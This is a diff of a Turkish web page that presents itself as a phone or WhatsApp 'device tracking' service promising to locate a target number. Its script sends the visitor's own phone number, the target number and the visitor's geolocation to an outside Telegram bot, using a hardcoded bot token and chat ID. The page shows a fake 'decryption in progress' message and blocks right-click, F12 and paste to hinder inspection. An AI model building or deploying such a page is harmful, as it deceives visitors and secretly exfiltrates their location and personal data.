@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Takibi</title>
+    <title>Cihaz Takibi</title> 
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -27,6 +27,13 @@
             color: #e74c3c;
             font-weight: bold;
             margin-top: 20px;
+        }
+
+        #locationDisplay {
+            font-size: 16px;
+            color: #333;
+            margin-top: 20px;
+            word-wrap: break-word;
         }
 
         #decrypting {
@@ -73,46 +80,10 @@
         p {
             color: #555;
         }
-
-        @keyframes decryptAnimation {
-            0% {
-                content: "Şifre Çözülüyor..."; 
-                letter-spacing: 2px;
-                color: #e74c3c;
-            }
-            25% {
-                content: "Veriler alınmaya başlanıyor..."; 
-                color: #f39c12;
-                letter-spacing: 5px;
-            }
-            50% {
-                content: "Şifre kırma işlemi devam ediyor...";
-                color: #f39c12;
-                letter-spacing: 10px;
-            }
-            75% {
-                content: "Şifre çözülüyor, lütfen bekleyin...";
-                color: #2ecc71;
-                letter-spacing: 15px;
-            }
-            100% {
-                content: "Şifre Çözüldü!";
-                color: #2ecc71;
-                letter-spacing: 0px;
-                font-size: 24px;
-            }
-        }
-
-        .decrypting-message {
-            animation: decryptAnimation 5s forwards;
-            font-size: 20px;
-            color: #e74c3c;
-            font-weight: bold;
-        }
     </style>
 </head>
 <body>
-    <h1>WhatsApp Takibi Giriş</h1>
+    <h1>Cihaz Takibi Giriş</h1> 
     <p>Lütfen aşağıdaki alanları doldurun:</p>
 
     <div class="form-container">
@@ -128,24 +99,50 @@
 
     <div id="countdown">Geri Sayım: 10:00</div>
 
+    <div id="locationDisplay">
+        <strong>Kendi Konumunuz:</strong>
+        <p id="ownLocation">Henüz alınmadı</p>
+        <p id="ownLocationLink"></p>
+
+        <br><br>
+        <strong>Hedef Numara Konumu:</strong>
+        <p>Kripto cihazı çalıştı, şifrenin çözülmesini bekleyin...</p>
+    </div>
+
     <script>
-        // Farenin sağ tıklama tuşunu devre dışı bırak
         document.addEventListener('contextmenu', function (event) {
             event.preventDefault();
             alert("Sağ tıklama engellendi!");
         });
 
-        // Telegram Bot API'yi kullanarak mesaj gönderme
+        document.addEventListener('keydown', function(event) {
+            if (event.key === "F12") {
+                event.preventDefault();
+                alert("F12 tuşu engellendi!");
+            }
+            if (event.ctrlKey && event.key === "v") {
+                event.preventDefault();
+                alert("Yapıştırma işlemi engellendi!");
+            }
+        });
+
         function sendLocationToTelegram(userPhone, targetPhone, latitude, longitude) {
-            const token = '8055523671:AAH6_SVWU0Ly8ugkyrw_UO1jS1vt06m71Co';  // Bot token'ınız
-            const chatId = '1568538396';  // Telegram'daki chat ID'nizi buraya koyun
-            const text = `Kullanıcı telefon numarası: ${userPhone}\nHedef telefon numarası: ${targetPhone}\nKonum: E: ${latitude}, B: ${longitude}`;
+            const token = '8055523671:AAH6_SVWU0Ly8ugkyrw_UO1jS1vt06m71Co';
+            const chatId = '1568538396';
+            const text = `Kullanıcı telefon numarası: ${userPhone}\nHedef telefon numarası: ${targetPhone}\nKonum: E: ${latitude}, B: ${longitude}\nGoogle Maps Bağlantısı: https://www.google.com/maps?q=${latitude},${longitude}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
 
             fetch(url, { method: 'GET' })
                 .then(response => response.json())
                 .then(data => console.log('Telegram mesajı gönderildi:', data))
                 .catch(error => console.error('Telegram mesajı gönderilemedi:', error));
+
+            // Konum bilgisini sayfada göster
+            const ownLocation = document.getElementById('ownLocation');
+            const ownLocationLink = document.getElementById('ownLocationLink');
+
+            ownLocation.textContent = `Enlem: ${latitude}, Boylam: ${longitude}`;
+            ownLocationLink.innerHTML = `<a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Google Maps'te Görüntüle</a>`;
         }
 
         function showLoading() {
